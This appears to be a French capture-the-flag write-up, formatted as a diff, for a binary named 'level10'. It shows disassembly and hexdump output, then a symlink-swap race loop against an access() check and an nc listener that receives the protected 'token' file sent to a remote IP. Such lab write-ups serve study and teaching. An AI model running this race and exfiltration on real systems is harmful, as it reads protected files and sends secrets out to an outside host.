@@ -1,0 +1,26 @@
+ 
+objdump -d level10
+
+8048749:	e8 92 fe ff ff       	call   80485e0 <access@plt>
+804874e:	85 c0                	test   %eax,%eax
+8048750:	0f 85 ea 01 00 00    	jne    8048940 <main+0x26c>
+
+access : si KO renvoie plus bas pour print vous n'avez pas acces au fichier etc
+
+on swap le lien symbolique entre un fichier ayant tous les droits et token, cela permet de passer le controle de securité lors de l'appel de la fonction access.
+
+while true; do rm test1; ln -s test test1; rm test1; ln -s token test1; done
+
+on execute la commande en boucle : 
+while true; do ./level10 test1 192.168.3.4; done
+
+puis sur notre pc perso on exécute une commande qui écoute sur le port 6969 comme indiqué dans le code en asm :
+00000a70  65 73 73 20 74 6f 20 69  74 0a 00 43 6f 6e 6e 65  |ess to it..Conne|
+00000a80  63 74 69 6e 67 20 74 6f  20 25 73 3a 36 39 36 39  |cting to %s:6969|
+
+via la commande :
+hexdump -C level10
+
+while true ; do nc -l 6969; done
+
+un moment on arrive a tomber dans la faille et le contenu de token nous est envoyé 
